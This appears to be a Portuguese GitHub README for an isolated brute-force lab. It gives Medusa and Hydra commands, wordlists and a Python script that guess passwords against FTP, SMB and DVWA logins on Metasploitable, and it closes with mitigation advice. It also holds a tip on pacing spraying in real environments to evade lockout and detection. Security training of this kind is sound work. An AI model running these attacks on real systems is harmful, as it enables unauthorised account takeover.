# MedusaKaliLinux
Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux
Estrutura do repositório
kali-medusa-lab/
├─ README.md                 # (este arquivo)
├─ env-setup.md              # instruções de preparação do ambiente (opcional)
├─ wordlists/
│  ├─ users.txt
│  └─ passwords.txt
├─ scripts/
│  └─ dvwa_bruteforce.py
├─ results/
│  ├─ medusa_ftp.txt
│  ├─ medusa_smb.txt
│  └─ dvwa_run.txt
├─ screenshots/
│  ├─ ftp_success.png
│  └─ smb_success.png
└─ mitigation_recommendations.md

1 — Aviso legal & ético

Este material é educacional.

Execute apenas em laboratórios isolados (Host‑only / Internal Network no VirtualBox) ou em máquinas para as quais você tem autorização explícita.

O autor não se responsabiliza por uso indevido.

2 — Objetivo do laboratório

Entender e demonstrar ataques de força bruta / password spraying contra serviços comuns: FTP, Web (formulário — DVWA) e SMB.

Usar Medusa (e, quando aplicável, hydra ou scripts Python) como ferramenta principal de automação.

Documentar wordlists, comandos, evidências e recomendações de mitigação.

3 — Requisitos e ambiente

Host: máquina com VirtualBox (ou VMware).

2 VMs recomendadas:

Kali Linux (atacante) — com Medusa, hydra, crunch, smbclient, python3, scrot, git.

Metasploitable 2 (alvo) — contém FTP, SMB e pode hospedar DVWA; ou outra VM com DVWA instalada (LAMP).

Rede: Host‑only ou Internal Network (sem acesso à internet) — ex.: 192.168.56.0/24.

Exemplo de IPs:

Kali: 192.168.56.101

Metasploitable/DVWA: 192.168.56.102

Pacotes úteis no Kali
sudo apt update
sudo apt install medusa hydra crunch smbclient scrot python3-requests git -y

4 — Wordlists usadas (exemplo)

Crie o diretório wordlists/ e adicione:

wordlists/users.txt

root
msfadmin
admin
user
test


wordlists/passwords.txt

password
123456
admin
msfadmin
toor
qwerty
P@ssw0rd


Gerar lista numérica com crunch (exemplo):

crunch 6 8 0123456789 -o wordlists/numeric.txt

5 — Cenário A: Força bruta em FTP (Medusa)

Objetivo: testar força bruta contra o serviço FTP do Metasploitable.

Comando Medusa (exemplo):

medusa -h 192.168.56.102 -M ftp -U wordlists/users.txt -P wordlists/passwords.txt -n 21 -f | tee results/medusa_ftp.txt


Parâmetros:

-h host alvo

-M ftp módulo FTP

-U lista de usuários

-P lista de senhas

-n porta (21 por padrão)

-f para parar ao encontrar credenciais válidas

tee salva a saída em results/medusa_ftp.txt

Validação manual (ex.: cliente FTP):

ftp 192.168.56.102
# no prompt ftp:
# user msfadmin msfadmin


Evidências sugeridas:

results/medusa_ftp.txt (saída do Medusa)

screenshot do login FTP bem-sucedido (screenshots/ftp_success.png)

6 — Cenário B: Password spraying e SMB

Objetivo: aplicar uma (ou poucas) senha(s) contra vários usuários para demonstrar password spraying e validar com smbclient.

Tentar com Medusa (módulo SMB — o nome do módulo pode variar conforme versão):

medusa -h 192.168.56.102 -M smbnt -U wordlists/users.txt -P wordlists/passwords.txt -f | tee results/medusa_smb.txt


Se o módulo não estiver disponível, alternativa com hydra:

hydra -L wordlists/users.txt -P wordlists/passwords.txt smb://192.168.56.102 -V | tee results/hydra_smb.txt


Validar credenciais com smbclient:

smbclient -L //192.168.56.102 -U msfadmin%msfadmin
# ou montar um share:
smbclient //192.168.56.102/shared -U msfadmin%msfadmin


Evidências sugeridas:

results/medusa_smb.txt ou results/hydra_smb.txt

screenshot do smbclient listado (screenshots/smb_success.png)

Nota sobre password spraying: em ambientes reais, espaçar tentativas para evitar lockouts e detecção. Em laboratório, documente o comportamento (lockouts, alertas).

7 — Cenário C: Ataque a formulário Web (DVWA)

DVWA tem um módulo "Brute Force" que pode ser configurado para demonstrar. Formulários web normalmente exigem manipulação de tokens (CSRF) — por isso apresentamos duas abordagens.

7.1 Script Python (requests) — scripts/dvwa_bruteforce.py

Crie scripts/dvwa_bruteforce.py:

#!/usr/bin/env python3
# dvwa_bruteforce.py — Exemplo simples para DVWA (ajuste URLs e strings conforme instalação)

import requests
from time import sleep
import os

target = "http://192.168.56.102/dvwa/vulnerabilities/brute/"  # ajustar se necessário
login_page = "http://192.168.56.102/dvwa/login.php"

session = requests.Session()

# login inicial no DVWA (usuário/admin padrão: admin/password)
login = {"username":"admin","password":"password","Login":"Login"}
r = session.post(login_page, data=login)

users = ["admin","msfadmin","test"]
passwords = ["password","123456","msfadmin","admin","toor"]

os.makedirs("results", exist_ok=True)

for u in users:
    for p in passwords:
        data = {"username": u, "password": p, "Login":"Login"}
        r = session.post(target, data=data)
        # Ajuste a string de sucesso/erro conforme HTML real do seu DVWA:
        if "Credentials Accepted" in r.text or "Successful" in r.text or "Welcome" in r.text:
            print(f"[+] POSSÍVEL acerto: {u}:{p}")
            with open("results/dvwa_hits.txt","a") as f:
                f.write(f"{u}:{p}\n")
        else:
            print(f"[-] {u}:{p} inválido")
        sleep(0.5)


Execução:

mkdir -p results
python3 scripts/dvwa_bruteforce.py | tee results/dvwa_run.txt


Observação: ajuste as strings de sucesso ("Credentials Accepted", etc.) de acordo com o HTML retornado pela tua instância DVWA. Para formularios com CSRF tokens, o script precisa extrair e reenviar o token.

7.2 Alternativa: Hydra (http-post-form)

Exemplo:

hydra -L wordlists/users.txt -P wordlists/passwords.txt 192.168.56.102 http-post-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Invalid username or password" -V | tee results/hydra_dvwa.txt


A string Invalid username or password deve ser substituída pelo texto de erro real do site.

Evidências sugeridas:

results/dvwa_run.txt

results/dvwa_hits.txt

screenshot do formulário com credencial válida

8 — Como capturar e armazenar evidências

Exemplos de comandos úteis:

# Salvar saídas de testes
medusa ... | tee results/medusa_ftp.txt

# Screenshot no Kali
scrot 'screenshots/ftp_success_%Y%m%d_%H%M%S.png'

# Registrar smbclient output
smbclient -L //192.168.56.102 -U msfadmin%msfadmin | tee results/smb_list.txt


Recomenda-se:

Nomear arquivos com timestamps.

Incluir descrições breves em .md separados (ex.: results/README.md) explicando o que cada arquivo contém.

Manter privacidade: não commite credenciais reais para repositório público (use placeholders).

9 — Recomendações de mitigação (resumo)
FTP

Substituir FTP por SFTP/FTPS (canal seguro).

Políticas de senha fortes (comprimento, complexidade).

Bloqueio/lockout após N tentativas; rate limiting.

Monitoramento de autenticações falhadas.

Web (formulários)

Implementar CSRF tokens, CAPTCHA após N tentativas e rate limiting.

Forçar MFA (quando possível).

Filtragem e WAF para detectar padrões de brute-force.

Bloqueio por IP/usuário gradual; alertas em SIEM.

SMB

Desabilitar SMBv1; aplicar atualizações.

Políticas de senha fortes e lockout.

Minimizar exposição de contas administrativas.

Habilitar SMB signing / canais seguros se aplicável.

Gerais

Auditorias regulares de senha / força de senha (safely).

Treinamento de usuários.

Logs centralizados e monitoramento (SIEM) para detectar padrões.

10 — Boas práticas para relatório no GitHub

Não publique senhas reais ou imagens contendo credenciais.

Adicione um LICENSE apropriado (MIT/CC-BY para documentação).

Use README.md claro com instruções de reprodução (IP, versão das VMs).

Inclua um DISCLAIMER.md ou seção no README sobre uso autorizado.

Exemplo de comandos git para publicar:

git init
git add .
git commit -m "Initial lab documentation - Medusa brute force"
git branch -M main
git remote add origin https://github.com/SEU_USUARIO/kali-medusa-lab.git
git push -u origin main

11 — Referências e leitura sugerida

Documentação do Medusa (man medusa ou medusa --help)

DVWA — configuração e modos (low, medium, high) para testes controlados

Ferramentas alternativas: hydra, Burp Suite, enum4linux, rpcclient

Conceitos: password spraying, rate limiting, CSRF, MFA, SIEM

12 — Próximos passos (sugestões de extensão)

Adicionar fail2ban e exemplos de configuração para bloquear tentativas repetidas.

Criar wordlists customizadas (substituições, masks com crunch).

Implementar automação com Ansible para criar o ambiente VMs.

Escrever notebooks que analisam logs e identificam padrões de ataque.

13 — Contato / Autor

Se quiseres, eu posso:

Gerar um env-setup.md com passos detalhados para configurar as VMs no VirtualBox.

Gerar um mitigation_recommendations.md com políticas exemplo (fail2ban, iptables).

Ajustar o script dvwa_bruteforce.py ao HTML exato do teu DVWA (cola aqui a página / string de sucesso).
